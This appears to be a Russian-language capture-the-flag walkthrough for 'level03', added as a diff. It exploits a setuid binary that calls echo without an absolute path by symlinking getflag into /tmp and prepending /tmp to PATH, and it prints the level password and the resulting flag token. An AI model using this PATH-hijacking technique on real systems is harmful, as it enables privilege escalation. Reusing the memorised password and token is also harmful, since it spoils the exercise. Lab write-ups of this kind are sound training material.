@@ -1,0 +1,31 @@
+su level03
+pass: kooda2puivaav1idi4f57q8iq
+
+ls -la
+
+Видим исполняемый файл, запускам
+cat level03
+
+./level03
+
+Смотрим список вызываемых процессом функций:
+ltrace ./level03
+
+> /usr/bin/env echo Exploit me
+
+Видим, что текст Exploit me выводится с помощью echo, при этом echo используется без абсолютного пути,
+значит мы можем заменить его с помощью символической ссылки на getflag
+
+which getflag
+> /bin/getflag
+
+ls -l /
+
+Есть права на папку /tmp
+
+ln -s /bin/getflag /tmp/echo
+
+Добавляем /tmp в переменную окружения
+env PATH="/tmp:$PATH" ./level03
+
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
